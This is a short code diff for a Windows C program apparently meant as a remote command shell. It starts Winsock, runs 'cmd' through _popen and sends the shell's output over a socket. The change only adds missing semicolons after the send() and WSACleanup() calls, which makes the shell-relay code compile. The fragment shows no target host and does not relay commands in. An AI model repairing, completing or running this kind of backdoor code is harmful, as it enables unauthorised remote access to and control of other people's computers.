@@ -27,7 +27,7 @@ if (WSAStartup(MAKEWORD(iReqWinsockVer,0), &wsaData)==0)
                 FILE* commText = _popen("cmd","r");
                 if (commText != NULL){
                     while(fgets(MSG, sizeof(MSG), commText) != NULL){
-                        send(hSocket, MSG, strlen(MSG), 0)
+                        send(hSocket, MSG, strlen(MSG), 0);
                     }
                 }
                 _pclose(commText);
@@ -35,7 +35,7 @@ if (WSAStartup(MAKEWORD(iReqWinsockVer,0), &wsaData)==0)
             closesocket(hSocket);
         }
     }
-    WSACleanup()
+    WSACleanup();
 }
 return 0;
 }
